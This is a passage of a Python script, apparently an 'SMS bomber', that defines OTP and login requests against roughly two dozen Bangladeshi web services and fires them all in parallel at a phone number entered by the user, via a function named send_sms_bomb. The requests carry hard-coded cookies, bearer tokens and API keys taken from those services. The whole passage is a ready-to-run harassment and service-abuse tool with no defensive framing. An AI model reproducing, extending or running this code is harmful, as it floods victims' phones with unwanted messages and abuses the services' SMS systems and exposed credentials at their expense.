            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'cookie': 'selectedArea=%7B%22area%22%3A%7B%7D%2C%22isDummySelectedArea%22%3Atrue%2C%22locationType%22%3A%22CURRENT_LOCATION%22%7D; _gcl_au=1.1.1657914934.1744888289; _fbp=fb.2.1744888289561.44530208368918440; _ga=GA1.1.417859319.1744888290; device-uuid=ba7834a0-1b7c-11f0-ad2b-d73d21afdc21; _ga_91FHYEDXE9=GS1.1.1744888289.1.1.1744888310.0.0.0'
        },
        'body': json.dumps({
            'auth': {
                'countryCode': '880',
                'deviceUuid': 'ba7834a0-1b7c-11f0-ad2b-d73d21afdc21',
                'phone': clean_phone,
                'type': 'LOGIN'
            },
            'captchaToken': 'no recapcha'
        })
    }
    
    requests_dict['osudh'] = {
        'url': 'https://api.osudpotro.com/api/v1/users/send_otp',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://osudpotro.com',
            'priority': 'u=1, i',
            'referer': 'https://osudpotro.com/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'mobile': '+88-' + clean_phone,
            'deviceToken': 'web',
            'language': 'en',
            'os': 'web'
        })
    }
    
    requests_dict['admission'] = {
        'url': 'https://www.admissionbd.net/e-commerce-ajax-files/mobile-verify.php',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.admissionbd.net',
            'Referer': 'https://www.admissionbd.net/signin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'Cookie': 'PHPSESSID=c002rpn9cvu6au090fh4tnlh7k; _fbp=fb.1.1744905387338.61219556320130605'
        },
        'body': f'PrimaryMobile={clean_phone}&verify=1'
    }
    
    requests_dict['aroggo'] = {
        'url': 'https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=134.0.0.0&os=Windows&osv=10',
        'method': 'POST',
        'headers': {
            'accept': '*/*',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.arogga.com',
            'referer': 'https://www.arogga.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': f'mobile={clean_phone}&fcmToken=&referral='
    }
    
    requests_dict['binge'] = {
        'url': f'https://web-api.binge.buzz/api/v3/otp/send/{phone_with_bangladesh_code}',
        'method': 'GET',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJGcmVlIiwiY3JlYXRlZEF0IjoiY3JlYXRlIGRhdGUiLCJ1cGRhdGVkQXQiOiJ1cGRhdGUgZGF0ZSIsInR5cGUiOiJ0b2tlbiIsImRldlR5cGUiOiJ3ZWIiLCJleHRyYSI6IjMxNDE1OTI2IiwiaWF0IjoxNzQ0ODgwOTY1LCJleHAiOjE3NDUwNTM3NjV9.KHV44u9Lzv55ARaVMe1QQ5v5vLkGDiT9PvkW5cFUXII',
            'Device-Type': 'web',
            'Origin': 'https://binge.buzz',
            'Referer': 'https://binge.buzz/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        }
    }
    
    requests_dict['chokro'] = {
        'url': 'https://chokrojan.com/api/v1/passenger/login/mobile',
        'method': 'POST',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'Authorization': 'Bearer null',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://chokrojan.com',
            'Referer': 'https://chokrojan.com/login',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'company-id': '1',
            'domain-name': 'chokrojan.com',
            'user-platform': '3'
        },
        'body': json.dumps({
            'mobile_number': clean_phone
        })
    }
    
    requests_dict['chorki'] = {
        'url': 'https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en',
        'method': 'POST',
        'headers': {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://www.chorki.com',
            'Referer': 'https://www.chorki.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'phone': clean_phone
        })
    }
    
    requests_dict['bus'] = {
        'url': 'https://api.busbd.com.bd/api/auth',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://busbd.com.bd',
            'referer': 'https://busbd.com.bd/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'phone': clean_phone
        })
    }
    
    requests_dict['deepto'] = {
        'url': 'https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en',
        'method': 'POST',
        'headers': {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.deeptoplay.com',
            'referer': 'https://www.deeptoplay.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'number': phone_with_bangladesh_code
        })
    }
    
    requests_dict['flipper2'] = {
        'url': 'https://portal.flipper.com.bd/api/v1/send-otp/login',
        'method': 'POST',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://flipper.com.bd',
            'Referer': 'https://flipper.com.bd/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'X-Authorization': 'QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3',
            'X-Otp-Auth': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3ZWIiOiJ0cnVlIiwicGxhdGZvcm0iOiJjaGFybWluZ3dlYiIsImlhdCI6MTc0NDkwOTA5OCwiZXhwIjoxNzQ0OTE2Mjk4fQ.5CkSegMxgbstpG1AsfIHchzBwT2Wz6cTOiL-UU5f2w4'
        },
        'body': json.dumps({
            'mobile_number': clean_phone
        })
    }
    
    requests_dict['fundesh2'] = {
        'url': 'https://fundesh.com.bd/api/auth/generateOTP?service_key=',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://fundesh.com.bd',
            'referer': 'https://fundesh.com.bd/fundesh/profile',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'Cookie': '_gid=GA1.3.992819867.1744905836; _gat_UA-146796176-2=1; _fbp=fb.2.1744905835932.560245964539210327; __gads=ID=6755eecba3780380:T=1744905836:RT=1744905836:S=ALNI_MazbePNmx6nKGVlMkdaPvXveOVL8w; __gpi=UID=000010a2bd3caca6:T=1744905836:RT=1744905836:S=ALNI_MZxEnej5m00Z8IUYH0edHTM-HKtsw; __eoi=ID=482d3ae45805132d:T=1744905837:RT=1744905837:S=AA-AfjZpw3P9gSx3LtKgQ7cfrkAq; FCNEC=%5B%5B%22AKsRol_30joTYoKGK52jke-uS5Hffnnlssb4VQRyxN4TupcXvQcdBC0c2axru7horhBxeEThUctDXCL7j0eU6lswQFr_NS317QXhy7UoyIUWW_uu5ySudP35ucCxquvnppdpj9Cv-WpQVzbkUQJoVhV461WaQVf4BA%3D%3D%22%5D%5D; _ga=GA1.3.1856865864.1744905836; _ga_5LF4359FD3=GS1.1.1744905836.1.1.1744905855.41.0.0'
        },
        'body': json.dumps({
            'msisdn': clean_phone
        })
    }
    
    requests_dict['ghoori'] = {
        'url': 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://ghoorilearning.com',
            'referer': 'https://ghoorilearning.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'mobile_no': clean_phone
        })
    }
    
    requests_dict['hoicoi'] = {
        'url': 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-477f3707-1e17-d9cd-e31e-1135ee020dbc',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://www.hoichoi.tv',
            'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'phoneNumber': phone_with_bangladesh_code,
            'requestType': 'send',
            'whatsappConsent': True
        })
    }
    
    requests_dict['hoicoi2'] = {
        'url': 'https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-87b5fbdc-e54f-0d18-28c9-b22ce1929297',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://www.hoichoi.tv',
            'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'phoneNumber': phone_with_bangladesh_code,
            'requestType': 'send',
            'screenName': 'signin'
        })
    }
    
    requests_dict['iscreen'] = {
        'url': 'https://api.rockstreamer.com/otp/api/v1/phone/otp',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE4NDAyODQyIiwicHJvdmlkZXJfaWQiOiIxNzQ0ODczMjc4OTU2LWxRbk4ycFVncG5oaVFKdjFQS3BrWk1xemQ4eXBrSThqTjFZYUNOZk1Iek9YZnNRdThEYXB5ZVNGZ2hYTFI2Zk4iLCJyb2xlIjo0LCJ1c2VybmFtZSI6IndJOTg3SCIsInBsYXRmb3JtIjoiaXNjcmVlbiIsInBhcnRuZXIiOm51bGwsInN1YnNjcmliZSI6ZmFsc2UsInBhY2thZ2VJbmZvIjpudWxsLCJpc1RWT0QiOmZhbHNlLCJ0dm9kRXhwaXJlRGF0ZSI6IjE5NzAtMDEtMDEiLCJpYXQiOjE3NDQ4NzMyNzgsImV4cCI6MTc0NDk1OTY3OH0.Vzp1zAJHy-4BerczODIKbkOGEjHnOSiZzL2V0owWWul0JLQSySa5WiyZ22rZlhxSgFByk0SzvDCxtUJDyz2pOpOCD3KSBB8Foyga9Tv83gHnlYOWswyk-IYQnyPsoNYIIANP2ZSD0NkOTIOteuazXekwrT1nKW4PUxTl1bVOVPK1uoz6p2ezjf82ONKGOqieS57zxwRwKs6YEmHfilWf73BxPKR0d-oKsI5SK3pwGKW73u9pTkk_fKMtQgkaZHAHXEklMpbwXH3Mer3k0ZBuO5zonhUt2v-ucA2WW1HKm14EmtKab-vosvfKqEZl-fPhWMAin56FHsZ3CUjowEdiUJqqZhmdHao7GpUSrMg35PYOxKDF8ZOBczUoLPhVctzaqVieBT1iqG2sDWfDbRIUZVSuAm-3eeAobSF8IzdVY87erBz_i2aaHufOK8rZfDOqJNuO6Y6wX6GxpE9QWrViplVUvtLCnqj_Ph37lcHGNYcvU7XOjfwTtNVIpsE3aO1ny1PlccbJPrgvsBfPcbXGURQYZxTbUu8yKd_awEc3qBiPmVTXHuLwo3EBOQqlBSvxw6H0k0G2FwK02VfV4HOkUR2JXGvEkkxUrpAi0CGM7HmoXBuHX0MuqQioWPbdTy1p9vJwdStjTbk6MQJ8nxc8PdIK8VzJ4SXx8FqxT73bB-8',
            'origin': 'https://iscreen.com.bd',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'phone_number': phone_with_bangladesh_code
        })
    }
    
    requests_dict['jatri'] = {
        'url': 'https://user-api.jslglobal.co:444/v2/send-otp',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://rental.jatri.co',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'phone': phone_with_bangladesh_code,
            'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'
        })
    }
    
    requests_dict['jotno'] = {
        'url': 'https://gw.jotno.net/auth/login/token',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://jotno.net',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'x-request-source': 'web'
        },
        'body': json.dumps({
            'userType': 'CONSUMER',
            'username': clean_phone,
            'apiKey': '03AFcWeA6Wc2mCNsrU3edOgxMdzzhI3loVfCHX96mvA6lJ2LKz8XLkMhI0d0L3vxmrv6BwWwk5Kn5rkaYBJGJH_8wWXvUV6ooHJU5UsJXEN7w38_5hd4G4-IVQgGFeDHGNLPQ0hxVCAMPKZjAY73kZKCKLwUyRdG1ld3I-r1O_aOvQbUelqjNjguZPGcc1QHqiyUPghVAxzm4kPLOVeBLGeX_wsaCFLc1jjXTsoMR3TQ3ybBnf0RCivKpmmzbhpYs0swgJr-F9ek-jUmdDMzLFk_8Ftn1HbQhBnocenNpVW3U63JFjAwN7dIc8p4ot3reqNcIut2tKmaqCmJXF_5-IlD8DX5BmLo9rbC1uw1HVIOMz0zHzxTCgzdPoG6O8ceNELYMuPkFJXJKj9cDKxVVZ5LCebg0IllKu601YqkQ2R7ru_9WtZw7iDuLAIEFXwCx-qxoMcu30cpnHsLny2rgXLgGJ-BrqQJljaXFTMMrX1c0t7atXxjlNl8rooS_A0E3uvw3YGmQGaR759m8ikqozf0ybEnUgEHqVcs6EAkYx2PdLFyFYv9sSSs3U-iqiXEYxbwc6uA9AERc0oZcPTsqQXe36WU3aZ2m00Q0XYisbhZd3POxZL0_7bBd8xpX7UFZokBX3HeTC6pYJR1HDzXTXDD3FEHkUvmhqyjwg-JAvU7vG7phJG6SeEy7cAY7ViGPP_Q-F6KKIpT0Cq0gje0QJHK2THaRt2BPQwxPgZHG7nCY5pSKnZhNtcwI0OIMFzywi4zFTphLPb3qEL_8MaD0mTj3JMugrSYA0OCEnPBW4iePKiUge_Ig6ttijKJ7y-EDV-xjV2Cq-MGpQgKvnSGHvc2T422oetPllKmwgKO50Md851ze8tUcu_kpO_Ap2Mr6rGo9v8FNYGrMpF4t3N8IRJhnbsjjrIuNOj-sC9M7cpq8IIKC8B1VIk9ruz4L59xAN-zueTNsA_s8WIzVneQDxtrLDiAho1CI419xHILFCFCEbsM_mBP-Hmq96c0fQTZzwggc_1q-p4CrjqAMdUltGE2r9JDwSnS22Gr84SmuzoVIV3BSqVm-kjWZJOV9_oaXMQxn2b9OR_y3r8NmujNq0IW36OATBqiDHRHJzhBni2aa8QVjGJ8JKxflySKlFw4b-9kwoL8Dg-Ndo59G4A-ge4Yt2YppQflIkutTLEdj1D-WJkNWVYtxF5b1y69CFsgKw9edMuQkP2CimATQHpftlR6ceYsVcaH2MOAtVfgO_d9mV5SfhC0yK-nOberzmLkXLimkLPnjgeN3iHRf7eLgwNZcCkQ-zDY78VPQ9ytg8aGUannG6IGu4nF-NlUaS28PK8x0JqUJL9FHcuEf1k9nJbsWZpO234_0WU8O0GgU9Aw7i8ki_krnuz-LRbNVnEm6VCuJLyGBLjmDW7WujHuAGixE-P1hKL0RrLwq0kNG9Pcb9_K33rF2a2OxFjdJNdSnU-XCBdouZVu0cvf3731xbxW3vN1QBXCB25-51xiwX-R1-4fy8KhBu9LLv0wWaWRse565SNk1wxYACf_FaQ-tilc3sSbsjbeHrnt3bwMLfj2gR-wxjP5kAqeahWqomdeloc8rWfh3RJiVKXdqCCs6eeygqRMtnaGks4JWKoNPMtMbRTzQy-x0CIMT1b8xEm6gkSrGtc5ajYecCD7MdZkMJfwfiWSLW9HW4bj9v6l7ze2FmWChaBeLc1emVeKzr0m7DKDcahXjzVI2UlrlsXwTbzD0wgjJuoyWvBm7hpfPCbDBnZthitPoFUMKQWAwOE5vnpurDuNmm0EJa28ErhsVYLQH58irspCvD9TasgptMZ9wZUa_35EIOOtU-HgAdNQilpzvulTrj3YEuEmQWV66R5igrNUPmw_zbX3W7N-IQxEy_WeJjV47Z9nwZk5ODvX_Hmuk9DNVry8kvECDSCf2xunsSeT3nsYQAONCKSJhT2x221D-fGqjMYT2eWetSNja1P6WaJAmdQ8Sfc--c4z0gp7akjv2EXXKfg7OCbDD07Hn4dDM2jQzSZGcFS0qhgmrCU0CMG0BapK8_'
        })
    }
    
    requests_dict['kormi'] = {
        'url': 'https://api.kormi24.com/graphql',
        'method': 'POST',
        'headers': {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://www.kormi24.com',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'operationName': 'sendOTP',
            'variables': {
                'type': 1,
                'mobile': clean_phone,
                'additional': json.dumps({
                    'user_agent': 'web',
                    'mobile': clean_phone
                }),
                'hash': '97376f3b22c0c2c0cc3bd4730fbff57e805fd1a91c2e52c448644f90d768d433'
            },
            'query': 'mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { status message __typename } }'
        })
    }
    
    requests_dict['laaz'] = {
        'url': 'https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister',
        'method': 'POST',
        'headers': {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://www.lazzpharma.com',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'ActivityId': '0b5510c9-c454-45e5-bd48-373c99492176',
            'Phone': clean_phone
        })
    }
    
    requests_dict['med'] = {
        'url': f'https://api.medeasy.health/api/send-otp/{phone_with_bangladesh_code}/',
        'method': 'GET',
        'headers': {
            'accept': 'application/json',
            'origin': 'https://medeasy.health',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        }
    }
    
    requests_dict['kire'] = {
        'url': 'https://app.kireibd.com/api/v2/send-signup-otp',
        'method': 'POST',
        'headers': {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://kireibd.com',
            'x-xsrf-token': 'eyJpdiI6IldqYktiM2dOTnJkdEJ3NEtVRUpaK1E9PSIsInZhbHVlIjoiWFRiN0pBZjlmaXllc2EwZjZ1V2RFQmtzL3pHSy9PcnU5bGV2SnpLcjJQTjFlL29zUjlpOUY2dkR4eDZ0SUZuamRubXdXa1FIR0liUS8wb3pRR0dPV09iOTN5MEM3aWZBcGpRdjRpY3d0SUdLTUpQT05MaGFaK2l2ZkNzWkZDc1AiLCJtYWMiOiJiYmIyZDMxN2Q3NTBmM2ViY2E5YjY4OWM4ODE4OTc2Yjk2ZGNlYWZjZWVkNmQxMmMxNjI3NzM1ZDRjN2I1MjI5IiwidGFnIjoiIn0=',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'email': clean_phone
        })
    }
    
    requests_dict['bioscope'] = {
        'url': 'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en',
        'method': 'POST',
        'headers': {
            'accept': 'application/json',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'authorization': '',
            'content-type': 'application/json',
            'origin': 'https://www.bioscopelive.com',
            'priority': 'u=1, i',
            'referer': 'https://www.bioscopelive.com/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'phone': '+88' + clean_phone
        })
    }
    
    # Execute all requests in parallel
    responses = execute_parallel_requests(requests_dict)
    
    # Process results
    result = {}
    for service, response in responses.items():
        result[service] = {
            'status': response['status'],
            'response': response['response'],
            'error': response['error']
        }
    
    # Add timestamp
    result['timestamp'] = datetime.now().isoformat()
    
    return result

if __name__ == "__main__":
    # For testing directly
    phone = input("Enter phone number: ")
    result = send_sms_bomb(phone)
    print(json.dumps(result, indent=2))
